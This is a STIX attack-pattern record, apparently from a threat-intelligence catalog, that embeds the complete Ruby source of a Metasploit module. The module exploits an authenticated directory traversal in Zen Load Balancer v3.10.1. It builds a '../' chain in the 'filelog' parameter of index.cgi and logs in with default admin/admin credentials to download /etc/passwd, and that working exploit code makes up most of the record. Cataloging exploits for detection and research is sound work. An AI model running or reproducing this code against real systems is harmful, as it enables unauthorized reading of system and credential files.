{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--147c26e3-b0e4-4804-a8e1-79d9e3e85272",
    "created": "2024-08-14T16:30:31.497823Z",
    "modified": "2024-08-14T16:30:31.497827Z",
    "name": "Zen Load Balancer Directory Traversal",
    "description": " This module exploits a authenticated directory traversal vulnerability in Zen Load Balancer `v3.10.1`. The flaw exists in 'index.cgi' not properly handling 'filelog=' parameter which allows a malicious actor to load arbitrary file path.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/zenload_balancer_traversal.rb",
            "external_id": "zenload_balancer_traversal.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Zen Load Balancer Directory Traversal',\n        'Description' => %q{\n          This module exploits a authenticated directory traversal vulnerability in Zen Load\n          Balancer `v3.10.1`. The flaw exists in 'index.cgi' not properly handling 'filelog='\n          parameter which allows a malicious actor to load arbitrary file path.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Basim Alabdullah', # Vulnerability discovery\n          'Dhiraj Mishra'     # Metasploit module\n        ],\n        'References' => [\n          ['EDB', '48308']\n        ],\n        'DisclosureDate' => '2020-04-10',\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'SideEffects' => [IOC_IN_LOGS],\n          'Reliability' => []\n        }\n      )\n    )\n\n    register_options(\n      [\n        Opt::RPORT(444),\n        OptBool.new('SSL', [true, 'Use SSL', true]),\n        OptInt.new('DEPTH', [true, 'The max traversal depth', 16]),\n        OptString.new('FILEPATH', [false, 'The name of the file to download', '/etc/passwd']),\n        OptString.new('TARGETURI', [true, 'The base URI path of the ZenConsole install', '/']),\n        OptString.new('HttpUsername', [true, 'The username to use for the HTTP server', 'admin']),\n        OptString.new('HttpPassword', [false, 'The password to use for the HTTP server', 'admin'])\n      ]\n    )\n  end\n\n  def run_host(ip)\n    filename = datastore['FILEPATH']\n    traversal = '../' * datastore['DEPTH']\n\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'index.cgi'),\n      'vars_get' =>\n      {\n        'id' => '2-3',\n        'filelog' => \"#{traversal}#{filename}\",\n        'nlines' => '100',\n        'action' => 'See logs'\n      },\n      'authorization' => basic_auth(datastore['HttpUsername'], datastore['HttpPassword'])\n    }, 25)\n\n    unless res && res.code == 200\n      print_error('Nothing was downloaded')\n      return\n    end\n\n    print_good(\"#{peer} - Downloaded #{res.body.length} bytes\")\n    path = store_loot(\n      'zenload.http',\n      'text/plain',\n      ip,\n      res.body,\n      filename\n    )\n    print_good(\"File saved in: #{path}\")\n  end\nend\n",
    "x_mitre_disclosure_date": "2020-04-10"
}